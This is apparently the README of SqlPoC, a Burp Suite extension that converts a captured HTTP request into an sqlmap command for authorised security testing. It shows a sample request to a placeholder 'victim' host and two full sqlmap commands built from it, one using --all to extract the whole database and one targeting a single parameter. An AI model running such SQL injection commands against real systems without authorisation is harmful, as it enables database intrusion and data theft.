# SqlPoC
SqlPoC is a burp extension to generate sqlmap PoC from target HTTP request.
It generates an sqlmap command from an HTTP request in Burp suite.
It can reduce the operational costs to make an sqlmap command.

## Screenshots

![Screenshot](https://raw.githubusercontent.com/tosebro/SqlPoC/master/screenshots/sqlpoc_01.png)

You can copy an sqlmap command to clipboard by selecting the item from the context menu.

## Usage

Select the item from the context menu, and you will get an sqlmap command.

For example, you will get the command from the HTTP request below:

    POST /sqli/sqlitest.php HTTP/1.1
    Host: victim.example.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: ja,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://victim.example.com/sqli/sqlitest.php
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 7
    
    id=mob1

You will get the command below:

    python sqlmap.py -u "http://victim.example.com:80/sqli/sqlitest.php" --cookie="" --referer="http://victim.example.com/sqli/sqlitest.php" --headers="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded" --host="victim.example.com" --user-agent="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" --all --data="id=mob1"

If you want to specify a target parameter, select the parameter name in HTTP request on Burp suite and generate a command.
When selecting parameter 'id', you will get:

    python sqlmap.py -u "http://victim.example.com:80/sqli/sqlitest.php" --cookie="" --referer="http://victim.example.com/sqli/sqlitest.php" --headers="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: ja,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded" --host="victim.example.com" --user-agent="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" --all --data="id=mob1" -p id

## Remarks

It mainly focuses on reducing operation costs when using sqlmap.
If a strict HTTP request is required to test the application, use sqlmap -r option which imports full HTTP request.

